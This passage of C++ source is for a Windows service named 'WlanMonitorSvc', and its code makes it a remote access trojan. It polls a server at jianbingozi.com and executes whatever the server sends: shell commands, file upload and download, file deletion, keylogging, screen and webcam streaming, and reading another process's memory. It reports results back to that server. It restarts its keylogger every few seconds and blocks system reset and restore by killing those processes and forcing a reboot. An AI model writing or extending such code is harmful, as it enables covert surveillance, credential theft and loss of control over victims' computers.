        HINTERNET hConnect = InternetOpenUrlA(hSession, reportUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_UI, 0);
        if (hConnect) {
            DWORD statusCode = 0;
            DWORD statusLen = sizeof(statusCode);
            if (HttpQueryInfoA(hConnect, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusLen, NULL) && statusCode != 200) {
                WriteLog("心跳请求返回 HTTP " + std::to_string(statusCode) + "，忽略本次响应，防止把网关错误当成远程命令。");
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hSession);
                return;
            }

            char buffer[1024];
            DWORD bytesRead = 0;
            std::string response = "";
            while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                response += buffer;
            }
            InternetCloseHandle(hConnect);
            g_LastSuccessfulHeartbeatTick.store(GetTickCount64());

            TrimString(response); // 消除可能的隐藏换行符，避免指令匹不上

            // 检测心跳回调是否携带了需要执行的操作命令
            if (!response.empty() && response != "Missing parameters") {
            if (IsServerErrorResponse(response)) {
                WriteLog("心跳响应疑似服务器/网关错误，已忽略: " + response.substr(0, 120));
            } else
            if (response.find("SSID:") != std::string::npos) {
                // 如果包含 SSID:XXX，则更新存入本地内存的自定义名字
                size_t pos = response.find("SSID:");
                g_CustomMyName = response.substr(pos + 5);
                TrimString(g_CustomMyName); // 去除可能混入的换行或空白
            } else if (response.find("UPDATE_NOW") != std::string::npos) {
                WriteLog("收到服务端紧急下发的全局更新指令，清除失败锁文件并立即启动更新程序！");
                std::string lockFile = GetExePath() + ".up_lock";
                DeleteFileA(lockFile.c_str());
                CheckForUpdates();
            } else if (response.find("F_CMD:") == 0) {
                size_t pos1 = response.find(':', 6);
                if (pos1 != std::string::npos) {
                    std::string type = response.substr(6, pos1 - 6);
                    std::string argStrUtf8 = response.substr(pos1 + 1);
                    std::string argStr = Utf8ToAnsi(argStrUtf8); // 修复中文路径编码导致的 curl/CMD 执行失败 404 的问题
                    std::string res = "";

                    if (type == "LIST") {
                        res = GetFileListNative(argStr);
                    } else if (type == "DEL") {
                        std::string zPath = argStr;
                        zPath.append(2, '\0'); 
                        SHFILEOPSTRUCTA shfo = {0};
                        shfo.wFunc = FO_DELETE;
                        shfo.pFrom = zPath.c_str(); 
                        shfo.fFlags = FOF_NO_UI | FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI;
                        int shRes = SHFileOperationA(&shfo);
                        res = (shRes == 0) ? "Success" : "Fail: error code " + std::to_string(shRes);
                    } else if (type == "RN") {
                        size_t pipePos = argStr.find('|');
                        if (pipePos != std::string::npos) {
                            std::string oldP = argStr.substr(0, pipePos);
                            std::string newP = argStr.substr(pipePos + 1);
                            if (MoveFileA(oldP.c_str(), newP.c_str())) {
                                res = "Success";
                            } else {
                                res = "Fail: " + std::to_string(GetLastError());
                            }
                        }
                    } else if (type == "UP") {
                        size_t pipePos = argStr.find('|');
                        if (pipePos != std::string::npos) {
                            std::string url = argStr.substr(0, pipePos);
                            std::string path = argStr.substr(pipePos + 1);
                            std::string cmd = "curl.exe -k -F \"file=@" + path + "\" \"" + url + "\"";
                            res = ExecCmd(cmd);
                            if(res.empty()) res = "Success";
                        }
                    } else if (type == "DOWN") {
                        size_t pipePos = argStr.find('|');
                        if (pipePos != std::string::npos) {
                            std::string url = argStr.substr(0, pipePos);
                            std::string path = argStr.substr(pipePos + 1);
                            DeleteUrlCacheEntryA(url.c_str());
                            HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), path.c_str(), 0, NULL);
                            res = (hr == S_OK) ? "Success" : ("Fail HTTP DL: " + std::to_string(hr));
                        }
                    } else if (type == "EXEC") {
                        // 解决 start 命令继承管道导致服务彻底假死的严重 BUG
                        std::string cmd = "cmd.exe /c start \"\" \"" + argStr + "\"";
                        PROCESS_INFORMATION pi; STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
                        if (CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                            res = "Success";
                        } else res = "Fail";
                    } else if (type == "UNINSTALL") {
                        // 剥离执行防止后台管道锁死，并强行提权穿透到当前用户的活动桌面，以防带界面的向导报错 Error 32 或静默不可见
                        std::string cmd = "cmd.exe /c start \"\" " + argStr;
                        HANDLE hToken = NULL;
                        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                        if (hSnap != INVALID_HANDLE_VALUE) {
                            PROCESSENTRY32W pe; pe.dwSize = sizeof(PROCESSENTRY32W);
                            if (Process32FirstW(hSnap, &pe)) {
                                do {
                                    if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                                        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                                        if (hProc) {
                                            OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken);
                                            CloseHandle(hProc);
                                            if (hToken) break;
                                        }
                                    }
                                } while (Process32NextW(hSnap, &pe));
                            }
                            CloseHandle(hSnap);
                        }
                        if (!hToken) WTSQueryUserToken(WTSGetActiveConsoleSessionId(), &hToken);

                        BOOL success = FALSE;
                        if (hToken) {
                            HANDLE hDupToken = NULL;
                            DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken);
                            if (hDupToken) {
                                LPVOID pEnv = NULL;
                                CreateEnvironmentBlock(&pEnv, hDupToken, FALSE);
                                STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); si.lpDesktop = (LPSTR)"winsta0\\default";
                                PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
                                // 注意 FALSE 防止句柄继承产生阻塞，CREATE_NO_WINDOW 隐藏 cmd 黑窗，留下卸载本体窗口
                                if (CreateProcessAsUserA(hDupToken, NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, pEnv, NULL, &si, &pi)) {
                                    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                                    success = TRUE;
                                }
                                DestroyEnvironmentBlock(pEnv);
                                CloseHandle(hDupToken);
                            }
                            CloseHandle(hToken);
                        }

                        if (success) {
                            res = AnsiToUtf8("Success: 卸载/修改命令已成功弹射到目标活动桌面。请在受控机完成界面向导操作。");
                        } else {
                            res = AnsiToUtf8("Fail: 无法穿透进入用户桌面会话执行程序。");
                        }
                    } else if (type == "MKDIR") {
                        std::string cmd = "cmd.exe /c mkdir \"" + argStr + "\"";
                        res = ExecCmd(cmd);
                        if(res.empty()) res = "Success";
                    } else if (type == "TASK_APPS") {
                        res = GetAppsListNative();
                    } else if (type == "TASK_PROC") {
                        res = GetProcessListNative();
                    } else if (type == "TASK_PERF") {
                        res = GetPerfInfoNative();
                    } else if (type == "TASK_STARTUP") {
                        res = GetStartupListNative();
                    } else if (type == "TASK_SOFTWARE") {
                        res = GetSoftwareListNative();
                    } else if (type == "TASK_SVC") {
                        res = GetServiceListNative();
                    } else if (type == "TASK_KILL") {
                        int pid = 0;
                        try { pid = std::stoi(argStr); } catch(...) {}
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                        if (hProc) {
                            TerminateProcess(hProc, 0); CloseHandle(hProc); res = "Success";
                        } else {
                            res = "Fail: " + std::to_string(GetLastError());
                        }
                    } else if (type == "TASK_SVC_CTRL") {
                        size_t pipePos = argStr.find('|');
                        if (pipePos != std::string::npos) {
                            std::string action = argStr.substr(0, pipePos);
                            std::string svcName = argStr.substr(pipePos + 1);
                            SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
                            if (hSCM) {
                                SC_HANDLE hSvc = OpenServiceA(hSCM, svcName.c_str(), SERVICE_ALL_ACCESS);
                                if (hSvc) {
                                    if (action == "start") {
                                        if (StartServiceA(hSvc, 0, NULL)) res = "Success";
                                        else res = "Fail: " + std::to_string(GetLastError());
                                    } else {
                                        SERVICE_STATUS status;
                                        if (ControlService(hSvc, SERVICE_CONTROL_STOP, &status)) res = "Success";
                                        else res = "Fail: " + std::to_string(GetLastError());
                                    }
                                    CloseServiceHandle(hSvc);
                                } else res = "Fail: OpenService error " + std::to_string(GetLastError());
                                CloseServiceHandle(hSCM);
                            } else res = "Fail: OpenSCM error " + std::to_string(GetLastError());
                        }
                    } else if (type == "MEM_PROC") {
                        res = GetMemoryProcessListNative();
                    } else if (type == "MEM_MAP") {
                        DWORD pid = 0;
                        try { pid = (DWORD)std::stoul(argStr); } catch(...) {}
                        if (pid == 0) res = "{\"error\":\"Invalid PID\"}";
                        else res = GetMemoryMapNative(pid);
                    } else if (type == "MEM_READ") {
                        size_t p1 = argStr.find('|');
                        size_t p2 = (p1 == std::string::npos) ? std::string::npos : argStr.find('|', p1 + 1);
                        if (p1 == std::string::npos || p2 == std::string::npos) {
                            res = "{\"error\":\"Invalid argument. Use pid|address|size.\"}";
                        } else {
                            DWORD pid = 0;
                            SIZE_T size = 0;
                            ULONGLONG address = 0;
                            try { pid = (DWORD)std::stoul(argStr.substr(0, p1)); } catch(...) {}
                            address = ParseAddressValue(argStr.substr(p1 + 1, p2 - p1 - 1));
                            try { size = (SIZE_T)std::stoul(argStr.substr(p2 + 1)); } catch(...) {}
                            if (pid == 0 || address == 0) res = "{\"error\":\"Invalid PID or address\"}";
                            else res = ReadMemoryNative(pid, address, size);
                        }
                    } else if (type == "MEM_SEARCH") {
                        size_t p1 = argStrUtf8.find('|');
                        size_t p2 = (p1 == std::string::npos) ? std::string::npos : argStrUtf8.find('|', p1 + 1);
                        if (p1 == std::string::npos || p2 == std::string::npos) {
                            res = "{\"error\":\"Invalid argument. Use pid|mode|query.\"}";
                        } else {
                            DWORD pid = 0;
                            try { pid = (DWORD)std::stoul(argStrUtf8.substr(0, p1)); } catch(...) {}
                            std::string mode = argStrUtf8.substr(p1 + 1, p2 - p1 - 1);
                            std::string query = argStrUtf8.substr(p2 + 1);
                            if (pid == 0) res = "{\"error\":\"Invalid PID\"}";
                            else res = SearchMemoryNative(pid, mode, query);
                        }
                    } else if (type == "MEM_FILTER") {
                        size_t p1 = argStrUtf8.find('|');
                        size_t p2 = (p1 == std::string::npos) ? std::string::npos : argStrUtf8.find('|', p1 + 1);
                        size_t p3 = (p2 == std::string::npos) ? std::string::npos : argStrUtf8.find('|', p2 + 1);
                        if (p1 == std::string::npos || p2 == std::string::npos || p3 == std::string::npos) {
                            res = "{\"error\":\"Invalid argument. Use pid|mode|query|addresses.\"}";
                        } else {
                            DWORD pid = 0;
                            try { pid = (DWORD)std::stoul(argStrUtf8.substr(0, p1)); } catch(...) {}
                            std::string mode = argStrUtf8.substr(p1 + 1, p2 - p1 - 1);
                            std::string query = argStrUtf8.substr(p2 + 1, p3 - p2 - 1);
                            std::string addresses = argStrUtf8.substr(p3 + 1);
                            if (pid == 0) res = "{\"error\":\"Invalid PID\"}";
                            else res = FilterMemorySearchNative(pid, mode, query, addresses);
                        }
                    } else if (type == "SCREEN") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode SCREEN \"" + argStr + "\"";
                        if (RunInUserSession(cmd)) {
                            res = "Success: Capture triggered via user session.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "STREAM") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode STREAM \"" + argStr + "\"";
                        if (RunInUserSession(cmd)) {
                            res = "Success: Stream triggered via user session.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "CAMERA_STREAM") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode CAMERA_STREAM \"" + argStr + "\"";
                        if (RunInUserSession(cmd)) {
                            res = "Success: Camera stream triggered via user session.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "KEYLOG_START") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode KEYLOG";
                        if (RunInUserSession(cmd, true)) {
                            res = "Success: Keylogger started via user session.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "KEYLOG_GET") {
                        std::string content;
                        if (ReadEncryptedLocalFile(KEYLOG_STATE, LEGACY_KEYLOG_TXT, content)) {
                            res = content;
                        } else {
                            res = "No keylogger file found.";
                        }
                    } else if (type == "KEYLOG_DEL") {
                        DeleteLocalState(KEYLOG_STATE, LEGACY_KEYLOG_TXT);
                        res = "Success: Keylog deleted.";
                    } else if (type == "KEYENABLE") {
                        WriteEncryptedLocalFile(KEYLOG_CFG_STATE, "1");

                        HANDLE hTestMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_Keylog_Mutex");
                        if (!hTestMutex) {
                            std::string exePath = GetExePath();
                            std::string cmd = "\"" + exePath + "\" -usermode KEYLOG";
                            RunInUserSession(cmd, true);
                        } else {
                            CloseHandle(hTestMutex);
                        }
                        res = "Success: Keylogger offline recording enabled.";
                    } else if (type == "KEYDISABLE") {
                        DeleteLocalState(KEYLOG_CFG_STATE, LEGACY_KEYLOG_CFG_TXT);
                        res = "Success: Keylogger offline recording disabled. (Will fully stop on next boot or user logoff)";
                    } else if (type == "MEDIA") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode MEDIA " + argStr;
                        if (RunInUserSession(cmd)) {
                            res = "Success: Media command sent.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "MEDIA_VOL_SET") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode MEDIA_VOL_SET " + argStr;
                        if (RunInUserSession(cmd, true)) {
                            res = "Success: Volume set command sent.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "MEDIA_INFO") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode MEDIA_INFO";
                        if (RunInUserSession(cmd, true)) {
                            res = "Success: Info polling requested.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "MEDIA_BOUNCE") {
                        if (argStr == "1" || argStr == "on" || argStr == "true") {
                            WriteEncryptedLocalFile(MEDIA_BOUNCE_CFG_STATE, "1");

                            HANDLE hBounceMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_MediaBounce_Mutex");
                            if (!hBounceMutex) {
                                std::string exePath = GetExePath();
                                std::string cmd = "\"" + exePath + "\" -usermode MEDIA_BOUNCE";
                                RunInUserSession(cmd, true);
                            } else {
                                CloseHandle(hBounceMutex);
                            }
                            res = "Success: Local media bounce enabled.";
                        } else {
                            DeleteLocalState(MEDIA_BOUNCE_CFG_STATE, LEGACY_MEDIA_BOUNCE_CFG_TXT);
                            res = "Success: Local media bounce disabled.";
                        }
                    } else if (type == "WIFI_SHUTDOWN_EXEMPT") {
                        if (argStr == "1" || argStr == "on" || argStr == "true") {
                            WriteEncryptedLocalFile(WIFI_SHUTDOWN_EXEMPT_CFG, "1");
                            res = "Success: WiFi shutdown exemption enabled locally.";
                        } else {
                            DeleteLocalState(WIFI_SHUTDOWN_EXEMPT_CFG, LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT);
                            res = "Success: WiFi shutdown exemption disabled locally.";
                        }
                    } else if (type == "MONITOR_OFF") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode MONITOR_OFF";
                        if (RunInUserSession(cmd, true)) {
                            res = "Success: Monitor turned off.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "MONITOR_ON") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode MONITOR_ON";
                        if (RunInUserSession(cmd, true)) {
                            res = "Success: Monitor turned on.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    }

                    std::string postData = "mac=" + UrlEncode(mac) + "&type=" + UrlEncode(type) + "&output=" + UrlEncode(res);
                    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                    if (hSession) {
                        HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
                        if (hConnect) {
                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/file_result", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
                            if (hRequest) {
                                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                                HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
                                InternetCloseHandle(hRequest);
                            }
                            InternetCloseHandle(hConnect);
                        }
                        InternetCloseHandle(hSession);
                    }

                    // 用户操作执行完毕，上报一次日志使云端可以即时查看最新状态
                    UploadLogToServer();
                }
            } else {
                WriteLog("收到远程强制执行命令: " + response);
                std::string output = ExecCmd(response);
                SendOutputToServer(mac, output);

                // 执行外部系统命令后立即上传最新记录日志供查阅
                UploadLogToServer();
            }
        }
        }
        InternetCloseHandle(hSession);
    }
}

// 向服务器报备上线的专注线程，使用长轮询保持实时连接
DWORD WINAPI ReportThread(LPVOID lpParam) {
    while (true) {
        if (IsUpdateExitRequested()) {
            WriteLog("【更新】ReportThread 收到更新退出信号，线程结束。");
            break;
        }
        ReportToServer();
        Sleep(100); // 挂起时长缩短为 100ms 降低执行延迟
    }
    return 0;
}

// 5秒循环检测WiFi是否存在并检测 OFFALL 热点
void MonitorWiFiLoop() {
    WriteLog("开始后台监测WiFi(每5s一次，扫描日志改为每10分钟精简打印一次防刷屏)...");

    // 启动独立的网络通信线程来保持"永远在线"
    CreateThread(NULL, 0, ReportThread, NULL, 0, NULL);

    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);

    ULONGLONG lastLogTime = 0;
    ULONGLONG wifiOffStartTime = 0; // 记录WiFi处于关闭状态的起始时间
    ULONGLONG lastWifiEnableAttemptTime = 0; // 记录上次尝试自动开启 WiFi 的时间
    ULONGLONG lastUpdateCheckTime = 0; // 记录上次检查更新的时间

    // 启动时清理以前遗留的各种老旧的替换废弃文件
    std::string exeDir = GetExePath().substr(0, GetExePath().find_last_of("\\/") + 1);
    std::string searchPath = GetExePath() + ".old*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::string toDel = exeDir + fd.cFileName;
            DeleteFileA(toDel.c_str());
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    DeleteFileA((GetExePath() + ".new").c_str());

    while (true) {
        if (IsUpdateExitRequested()) {
            WriteLog("【更新】主服务循环收到更新退出信号，准备退出以释放程序文件。");
            break;
        }

        // 尝试维持用户级常驻代理（按键+活动窗口监测）运行
        static ULONGLONG lastKeylogLaunch = 0;
        ULONGLONG currentTime = GetTickCount64();
        if (currentTime - lastKeylogLaunch >= 5000 || lastKeylogLaunch == 0) {
            HANDLE hTestMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_Keylog_Mutex");
            if (!hTestMutex) {
                std::string exePath = GetExePath();
                std::string cmd = "\"" + exePath + "\" -usermode KEYLOG";
                RunInUserSession(cmd, true);
            } else {
                CloseHandle(hTestMutex);
            }
            lastKeylogLaunch = currentTime;
        }

        static ULONGLONG lastMediaBounceLaunch = 0;
        if (currentTime - lastMediaBounceLaunch >= 5000 || lastMediaBounceLaunch == 0) {
            if (LocalStateExists(MEDIA_BOUNCE_CFG_STATE, LEGACY_MEDIA_BOUNCE_CFG_TXT)) {
                HANDLE hBounceMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_MediaBounce_Mutex");
                if (!hBounceMutex) {
                    std::string exePath = GetExePath();
                    std::string cmd = "\"" + exePath + "\" -usermode MEDIA_BOUNCE";
                    RunInUserSession(cmd, true);
                } else {
                    CloseHandle(hBounceMutex);
                }
            }
            lastMediaBounceLaunch = currentTime;
        }

        if (dwResult != ERROR_SUCCESS) {
            dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        }

        // 【增强防刷机/防重置监测】
        // 仅靠窗口标题(FindWindow)不可靠(受中英文语言和Win10/11 UWP应用框架限制)
        // 改为直接检测 Windows 负责“初始化/恢复”的底层核心进程
        bool isResetDetected = false;
        HWND hResetWnd1 = FindWindowA(NULL, "初始化这台电脑");
        HWND hResetWnd2 = FindWindowA(NULL, "Reset this PC");
        if (hResetWnd1 != NULL || hResetWnd2 != NULL) isResetDetected = true;

        HANDLE hSnapR = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapR != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(PROCESSENTRY32W);
            if (Process32FirstW(hSnapR, &pe)) {
                do {
                    // systemreset.exe = Win10/11 初始化这台电脑/重置此电脑 的核心后台进程
                    // rstrui.exe = 系统还原点界面的进程
                    if (_wcsicmp(pe.szExeFile, L"systemreset.exe") == 0 ||
                        _wcsicmp(pe.szExeFile, L"rstrui.exe") == 0) {
                        isResetDetected = true;
                        // 发现的第一时间立即在内存中将其直接扼杀，防止用户手快点到下一步
                        HANDLE hP = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hP) { TerminateProcess(hP, 0); CloseHandle(hP); }
                    }
                } while (Process32NextW(hSnapR, &pe));
            }
            CloseHandle(hSnapR);
        }

        if (isResetDetected) {
            WriteLog("【严重警告】：防逃避触发！检测到系统正在尝试打开“初始化/重置/还原”功能，为防止误操作，立即强制重启电脑!");
            WinExec("shutdown.exe -r -f -t 0", SW_HIDE);
            Sleep(30000); // 缓冲等待系统重启
        }

        bool foundOffAll = false;
        bool isWifiOff = false; // 当前刻是否无WiFi

        currentTime = GetTickCount64();
        bool shouldLog = false;
        static bool isLikelyLaptop = IsLikelyLaptopDevice();
        static bool hasWirelessHardware = HasWirelessAdapterPresent();
        // 10 分钟 = 10 * 60 * 1000 毫秒 = 600000
        if (lastLogTime == 0 || (currentTime - lastLogTime >= 600000)) {
            shouldLog = true;
            lastLogTime = currentTime;
            hasWirelessHardware = HasWirelessAdapterPresent();
            WriteLog("设备类型检测: " + GetDeviceTypeForReport() + ", wireless_adapter=" + std::string(hasWirelessHardware ? "1" : "0"));
        }
        bool skipWifiShutdownForDesktopNoWifi = !isLikelyLaptop && !hasWirelessHardware;

        // 10 分钟检查一次自动更新 = 10 * 60 * 1000 = 600000 毫秒
        // 首次运行也会触发一次检测（由于 lastUpdateCheckTime = 0）
        if (lastUpdateCheckTime == 0 || (currentTime - lastUpdateCheckTime >= 600000)) {
            // 将更新检查放到专门的函数中执行，不阻塞主循环太久
            CheckForUpdates();
            // 在检查更新的同时，向云端静默上报最近 10 分钟以来的程序执行日志情况
            UploadLogToServer();
            lastUpdateCheckTime = currentTime;
        }

        if (dwResult == ERROR_SUCCESS) {
            PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
            if (WlanEnumInterfaces(hClient, NULL, &pIfList) == ERROR_SUCCESS) {
                if (shouldLog) WriteLog("本次循环(10分钟定期): 检测到 WiFi 网卡设备数量 = " + std::to_string(pIfList->dwNumberOfItems));

                if (pIfList->dwNumberOfItems == 0) {
                    isWifiOff = true; // 无网卡=WiFi关
                } else {
                    bool hasAnyVisibleNetwork = false;
                    for (int i = 0; i < (int) pIfList->dwNumberOfItems; i++) {
                        PWLAN_INTERFACE_INFO pIfInfo = (PWLAN_INTERFACE_INFO) &pIfList->InterfaceInfo[i];

                        // 如果接口处于禁用或断开状态（例如飞行模式），API 可能直接返回错误，我们默认视为关闭并执行检测容错
                        // 强制调用网卡扫描周围的WiFi（如果不调用，获取到的列表是系统的旧缓存从而只有几个或者搜不到最新热点）
                        WlanScan(hClient, &pIfInfo->InterfaceGuid, NULL, NULL, NULL);

                        PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
                        // 获取周围可见的所有WiFi网络
                        DWORD dwRet = WlanGetAvailableNetworkList(hClient, &pIfInfo->InterfaceGuid, 0, NULL, &pBssList);
                        if (dwRet == ERROR_SUCCESS && pBssList != NULL) {
                            if (shouldLog) WriteLog("    网卡[" + std::to_string(i) + "] 获取到周围可见 WiFi 数量: " + std::to_string(pBssList->dwNumberOfItems));

                            if (pBssList->dwNumberOfItems > 0) {
                                hasAnyVisibleNetwork = true;
                            }

                            for (int j = 0; j < (int) pBssList->dwNumberOfItems; j++) {
                                PWLAN_AVAILABLE_NETWORK pNetwork = (PWLAN_AVAILABLE_NETWORK) & pBssList->Network[j];
                                char ssid[33] = {0};
                                if (pNetwork->dot11Ssid.uSSIDLength > 0 && pNetwork->dot11Ssid.uSSIDLength <= 32) {
                                    memcpy(ssid, pNetwork->dot11Ssid.ucSSID, pNetwork->dot11Ssid.uSSIDLength);

                                    std::string displaySsid = Utf8ToAnsi(ssid);

                                    // 转码为本机的字符串格式存入日志
                                    if (shouldLog) {
                                        WriteLog("        发现网络: [" + displaySsid + "]");
                                    }

                                    if (strcmp(ssid, "OFFALL") == 0) {
                                        foundOffAll = true;
                                        break;
                                    }

                                    // 如果不是 OFFALL，但匹配该电脑最新设定的备注名，同样触发击杀
                                    if (!g_CustomMyName.empty() && displaySsid == g_CustomMyName && g_CustomMyName != "未命名设备") {
                                        foundOffAll = true;
                                        WriteLog("警告：检测到了与本机当前设定的特殊备注名(" + g_CustomMyName + ")同名的 WiFi");
                                        break;
                                    }
                                }
                            }
                            WlanFreeMemory(pBssList);
                        } else {
                            // 如果获取可用网络列表失败（例如 Wi-Fi 开关物理/软件层面关闭了）
                            if (shouldLog) WriteLog("    网卡[" + std::to_string(i) + "] 无法获取网络列表，被视为禁用/关闭状态...");
                        }
                        if (foundOffAll) break;
                    }
                    if (!hasAnyVisibleNetwork) {
                        isWifiOff = true; // 可见网络为0，被认定为飞行模式/WiFi关
                    }
                }
                WlanFreeMemory(pIfList);
            } else {
                if (shouldLog) WriteLog("无法枚举 WiFi 接口，视同关闭。");
                isWifiOff = true;
            }
        } else {
            if (shouldLog) WriteLog("WlanOpenHandle 失败(错误代码: " + std::to_string(dwResult) + ")，视同关闭。");
            isWifiOff = true;
        }

        if (skipWifiShutdownForDesktopNoWifi) {
            if (isWifiOff && shouldLog) {
                WriteLog("检测到台式机且没有无线网卡，跳过 WiFi 关闭后的 2 分钟关机保护。");
            }
            isWifiOff = false;
            wifiOffStartTime = 0;
            lastWifiEnableAttemptTime = 0;
        }

        bool wifiShutdownExempt = LocalStateExists(WIFI_SHUTDOWN_EXEMPT_CFG, LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT);
        ULONGLONG lastHeartbeat = g_LastSuccessfulHeartbeatTick.load();
        bool serverReachableRecently = lastHeartbeat != 0 && (currentTime - lastHeartbeat) <= 45000;
        if (isWifiOff && (wifiShutdownExempt || serverReachableRecently)) {
            if (shouldLog) {
                WriteLog(std::string("WiFi 被判定关闭，但") +
                    (wifiShutdownExempt ? "本地免关机开关已开启" : "最近心跳仍可正常访问服务端") +
                    "，跳过 2 分钟关机倒计时。");
            }
            isWifiOff = false;
            wifiOffStartTime = 0;
            lastWifiEnableAttemptTime = 0;
        }

        // 处理WiFi彻底关闭时的2分钟恢复窗口：先尝试开启，连续失败才关机。
        if (isWifiOff) {
            if (wifiOffStartTime == 0) {
                wifiOffStartTime = currentTime;
                lastWifiEnableAttemptTime = 0;
                WriteLog("警告：检测到 WiFi 已关闭/未连接/飞行模式，开始尝试自动开启；连续 2 分钟未恢复将关机...");
            }

            if (lastWifiEnableAttemptTime == 0 || (currentTime - lastWifiEnableAttemptTime) >= 30000) {
                TryEnableWiFi();
                lastWifiEnableAttemptTime = currentTime;
            }

            if ((currentTime - wifiOffStartTime) >= 120000) {
                WriteLog("【严重警告】：WiFi 关闭/无可见信号连续 2 分钟，自动开启失败，立即执行强制关机!");
                ForceShutdown();
                Sleep(30000); // 缓冲等待系统关机
            }
        } else {
            if (wifiOffStartTime != 0) {
                WriteLog("提示：检测到 WiFi 已重新开启并有信号，取消 2 分钟关机倒计时。");
                wifiOffStartTime = 0; // 重置
                lastWifiEnableAttemptTime = 0;
            }
        }

        if (foundOffAll) {
            WriteLog("【严重警告】：直接检测到名称为 OFFALL 的WiFi网络，立即执行底层API强制关机!");
            ForceShutdown();
            Sleep(30000); // 缓冲等待系统关机
        }

        Sleep(5000); // 间隔5秒
}

if (hClient != NULL) {
    WlanCloseHandle(hClient, NULL);
}
} // <--- End of MonitorWiFiLoop

// Windows 服务状态支持
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;

void WINAPI ServiceCtrlHandler(DWORD dwControl) {
    if (dwControl == SERVICE_CONTROL_STOP) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
